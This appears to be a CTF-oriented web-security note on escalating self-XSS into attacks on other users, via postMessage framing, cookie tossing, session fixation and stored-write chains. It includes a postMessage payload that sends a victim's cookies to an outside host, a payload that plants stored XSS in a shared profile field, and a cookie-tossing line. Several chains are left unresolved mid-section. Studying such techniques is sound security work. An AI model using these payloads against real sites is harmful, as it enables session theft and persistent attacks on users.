# Self-XSS → real XSS — turning "only you" into "anyone"

Self-XSS fires only in YOUR browser — useless alone, but chainable
into real XSS through three bridges: login-CSRF, postMessage
framing, and clickjacking.

---

## 1. What makes it "self"

```text
the payload renders on a page only YOU can view:
- your own profile settings page
- your account-detail page
- a search-results page with YOUR session's searches
- a page built from YOUR cookies
```

The payload runs in YOUR origin — stealing YOUR cookie is pointless;
the goal is reaching ANOTHER user's session.

---

## 2. Bridge 1 — login-CSRF / session-confusion

```text
the trick: log the VICTIM into YOUR account → they view the
self-XSS page under YOUR credentials → the payload fires in
THEIR browser → steal THEIR... wait — the page is YOUR session
```

Actually backwards — login-CSRF logs the victim into YOUR account,
so they see YOUR self-XSS page — but it's YOUR session's page!
The flag would be in THEIR session — this doesn't reach it.

The correct version: force-login the victim to THEIR account on
YOUR crafted URL — needs a login endpoint you can CSRF:

```text
1. victim clicks your link
2. your page POSTs victim's creds to the login endpoint (CSRF)
   — you don't know their creds — DEAD END unless pre-set session
```

The real path — session-fixation: plant a known session cookie in
the victim's browser (subdomain cookie-tossing, or a set-cookie
endpoint), then they view your self-XSS page under the PLANTED
session — your payload still runs in that session's context. The
flag must be reachable FROM that context — usually it isn't unless
the flag is origin-scoped not session-scoped.

Honest assessment: login-CSRF/self-XSS is a real web-sec class but
rarely the CTF path — the bot-visits-your-page chain is more
standard. Keep this section thin and honest.

---

## 3. Bridge 2 — postMessage into the vulnerable page

The real pivot: the vulnerable page has a `message` listener with
no origin check — your page iframes it and injects:

```html
<!-- your page: -->
<iframe src="https://target.com/self-xss-page"></iframe>
<script>
  frames[0].onload = () => frames[0].postMessage(
    '<img src=x onerror=fetch("//me/?c="+document.cookie)>','*');
</script>
```

The listener writes your message into the target's DOM — now the
payload runs in TARGET's context (not your self-context) when the
BOT visits your page.

`postmessage.md` is the full listener-hunt file.

---

## 4. Bridge 3 — the self-XSS + opener pivot

```javascript
// your self-XSS payload opens the target and steals via window.name:
window.name = document.cookie;
location = 'https://target.com/flag-page';
   -- no — name is YOUR window's, not the target's

// the correct direction — you control the OPENER:
// bot opens target → target's self-XSS reads opener-controlled data
// — the bot is the opener, you don't control it — dead
```

The only working opener direction: YOU open the target — but the
bot is the one who needs to open it. Skip.

---

## 5. Bridge 4 — the cookie-toss chain

Subdomain lets you SET a cookie on the parent domain:

```javascript
// attacker-controlled subdomain page:
document.cookie = 'session=PLANTED; domain=.target.com';
   -- the victim's session is now PLANTED — they view the
      self-xss page under PLANTED session
```

Then your self-XSS fires in the PLANTED session — still only YOUR
context. The flag needs to be origin-scoped for this to matter.
Session-fixation + self-XSS is the chain — rare in CTF.

---

## 6. Bridge 5 — stored via self-XSS write primitive

```javascript
// your self-XSS can WRITE — turn self into stored:
<img src=x onerror="fetch('/api/profile',{method:'POST',
  body:JSON.stringify({bio:'<img src=x onerror=alert(1)>'})})">
   -- your self-XSS writes a STORED payload into a shared field —
      the stored payload fires for OTHER viewers
```

The self-XSS becomes the delivery mechanism — the stored field is
the real injection point. If you can write anywhere another user
reads, self-XSS just automates the write.

---

## 7. The honest summary — when to keep vs escalate

```text
keep:    there's a message-listener on the page → postMessage bridge
keep:    there's a writable shared field → self→stored
keep:    the bot visits your page → iframe+postMessage chain
escalate: cookie-only self-XSS with no writable surfaces —
          report it as self-XSS, don't force a chain that isn't there
```

Self-XSS alone is a valid finding when the field reflects
dangerously — the escalation to "real" XSS is context-dependent,
not automatic.
